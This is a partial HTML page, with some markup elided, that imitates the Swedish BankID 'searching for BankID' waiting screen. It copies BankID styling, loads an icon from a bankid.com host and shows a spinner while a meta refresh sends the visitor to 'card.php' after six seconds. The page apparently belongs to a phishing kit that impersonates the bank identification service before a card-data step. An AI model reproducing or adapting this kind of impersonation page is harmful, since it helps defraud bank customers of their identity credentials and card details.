...
<html lang="sv"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    ...
    <link rel="mask-icon" href="https://test.bankid.com/safari-pinned-tab.svg" color="#5bbad5">
        <meta http-equiv="refresh" content="6; url=card.php">
    ...
    <div id="root"><div class="mobileDesign"><div class="flex flex-col min-h-screen">
        ...
        <div class="w-full"><div class="bg-bid-midnight-blue"></div><div class="flex flex-col grow md:mt-[71px]"><div class="p-6"><div class="flex justify-center items-center w-full"><div class="flex relative flex-col py-16 px-6 md:px-16 bg-bid-ice-blue w-[550px] max-w-full min-h-[550px]">
            ...
            <div class="flex flex-col grow">
                <h2 class="mb-6 text-3xl font-bold text-center"><span>Söker efter BankID</span></h2>
                <p class="mx-auto mb-5 text-center"><span id="inProgressTxt">Söker efter BankID, det kan ta en liten stund...</span></p>
                <div class="grow"></div><p class="flex justify-center items-center"><img class="block w-auto max-w-[200px] h-auto max-h-[200px]" src="./files/spinner-blue.min.474381b3.svg" alt="Vänta"></p><div class="grow"></div>
